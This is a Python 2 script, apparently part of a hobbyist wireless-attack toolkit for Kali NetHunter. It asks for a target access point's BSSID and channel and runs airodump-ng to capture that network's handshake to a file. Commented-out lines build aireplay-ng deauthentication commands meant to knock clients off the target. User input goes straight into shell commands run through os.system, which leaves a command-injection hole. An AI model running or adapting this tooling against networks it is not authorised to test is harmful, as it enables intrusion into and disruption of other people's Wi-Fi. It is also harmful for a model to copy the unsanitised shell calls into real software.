#!/usr/bin/env python
# coding=UTF-8

import os
import socket
import operator
# from termcolor import colored
import sys
# sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
import time

os.system('cat /root/ArmsCommander/wirelessattacks/Cylon-Raider/banner_airodump.txt')
class airodump_Parameters_Targeted(object):

    def __init__(self, capture_BSSID, capture_Channel):
        self.capture_BSSID = capture_BSSID
        self.capture_Channel = capture_Channel

    @classmethod
    def from_input(cls):
        return cls(
            str(raw_input("Enter the BSSID/Broadcast MAC Address of your TARGET: ")),
            str(raw_input("Enter the CHANNEL of the device you want to TARGET: "))
                    )

user_input = airodump_Parameters_Targeted.from_input()
print 'Beginning targeted capture'
timestr = (time.strftime("%Y%m%d-%H%M%S"))
# make it so that I create a folder with that same instance of handshake capture
airodump_capture_filepath = "/root/ArmsCommander/logs/Cylon-Raider/"
airodump_capture_folder = airodump_capture_filepath + user_input.capture_BSSID + '/'
make_Folder_String = "mkdir {0}".format(airodump_capture_folder)
os.system(make_Folder_String)
airodump_capture_file = airodump_capture_folder + timestr + ".cap"
cmd_String = "airodump-ng --bssid {0} -c {1} --write {2} wlan1mon".format(
    user_input.capture_BSSID,
    user_input.capture_Channel,
    airodump_capture_file,
)
print cmd_String

os.system(cmd_String)

# Lets try X-Term on Android
# deauth_Cmd_String = "aireplay-ng --deauth {0} -a {1} --ignore-negative-one wlan1mon".format(
#     user_input.amount_Deauth_Packets,
#     user_input.capture_BSSID
#         )
# os.system("xterm -e 'bash -c \"%s; exec\"'") % deauth_Cmd_String
# also doesnt work.
# apaprently its not some sort of normal terminal for android. All I know it's some sort of variant of nh-terminal

# store_BSSID()
# # save the BSSID for importing by Replay module
# def store_BSSID():
#     global target_BSSID
#     target_BSSID = user_input.capture_BSSID
#     return target_BSSID

# Still doesnt work. I don't think declaring a class is a good idea, but then again I am getting hings from Stackoverflow, which is a terrible source of a straight answer
# now open a new terminal and run aireplay
# actually that wont work because gnome-terminal does not exist on Kali Nethunter
# os.system("gnome-terminal -e 'bash -c \"python /root/ArmsCommander/wirelessattacks/Cylon-Raider/CrackHead_Replay.py; exec bash\"'")

        # Doesnt work. Might as well try importing this module into Replay
# deauth_Cmd_String = "aireplay-ng --deauth {0} -a {1} --ignore-negative-one wlan1mon".format(
#     user_input.amount_Deauth_Packets,
#     user_input.capture_BSSID
#         )
# os.system("gnome-terminal -e 'bash -c \"%s; exec\"'") % deauth_Cmd_String
